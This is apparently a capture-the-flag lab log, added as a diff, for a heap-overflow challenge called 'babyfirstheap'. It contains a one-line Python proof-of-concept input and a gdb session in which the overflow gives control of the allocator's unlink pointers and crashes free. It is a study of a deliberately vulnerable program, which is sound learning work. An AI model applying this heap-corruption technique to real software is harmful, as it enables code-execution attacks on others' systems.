@@ -1,0 +1,68 @@
+pwn@ubuntu:~$ python -c 'print "BBBB"+"CCCC"+"A"*252'>>poc
+pwn@ubuntu:~$ gdb -q ./babyfirstheap
+Reading symbols from ./babyfirstheap...done.
+(gdb) r < poc
+Starting program: /home/pwn/babyfirstheap < poc
+
+Welcome to your first heap overflow...
+I am going to allocate 20 objects...
+Using Dougle Lee Allocator 2.6.1...
+Goodluck!
+
+Exit function pointer is at 804C8AC address.
+[ALLOC][loc=8EC2008][size=1246]
+[ALLOC][loc=8EC24F0][size=1121]
+[ALLOC][loc=8EC2958][size=947]
+[ALLOC][loc=8EC2D10][size=741]
+[ALLOC][loc=8EC3000][size=706]
+[ALLOC][loc=8EC32C8][size=819]
+[ALLOC][loc=8EC3600][size=673]
+[ALLOC][loc=8EC38A8][size=1004]
+[ALLOC][loc=8EC3C98][size=952]
+[ALLOC][loc=8EC4058][size=755]
+[ALLOC][loc=8EC4350][size=260]
+[ALLOC][loc=8EC4458][size=877]
+[ALLOC][loc=8EC47D0][size=1245]
+[ALLOC][loc=8EC4CB8][size=1047]
+[ALLOC][loc=8EC50D8][size=1152]
+[ALLOC][loc=8EC5560][size=1047]
+[ALLOC][loc=8EC5980][size=1059]
+[ALLOC][loc=8EC5DA8][size=906]
+[ALLOC][loc=8EC6138][size=879]
+[ALLOC][loc=8EC64B0][size=823]
+Write to object [size=260]:
+Copied 261 bytes.
+[FREE][address=8EC2008]
+[FREE][address=8EC24F0]
+[FREE][address=8EC2958]
+[FREE][address=8EC2D10]
+[FREE][address=8EC3000]
+[FREE][address=8EC32C8]
+[FREE][address=8EC3600]
+[FREE][address=8EC38A8]
+[FREE][address=8EC3C98]
+[FREE][address=8EC4058]
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080493f6 in free (mem=0x8ec4058) at malloc.c:1259
+1259	malloc.c: 그런 파일이나 디렉터리가 없습니다.
+(gdb) i r
+eax            0x42424242	1111638594
+ecx            0x8ec2004	149692420
+edx            0x43434343	1128481603
+ebx            0xf76d7000	-143822848
+esp            0xffac4580	0xffac4580
+ebp            0xffac45b8	0xffac45b8
+esi            0x0	0
+edi            0x0	0
+eip            0x80493f6	0x80493f6 <free+273>
+eflags         0x10216	[ PF AF IF RF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/i $pc
+=> 0x80493f6 <free+273>:	mov    %edx,0x8(%eax)
+
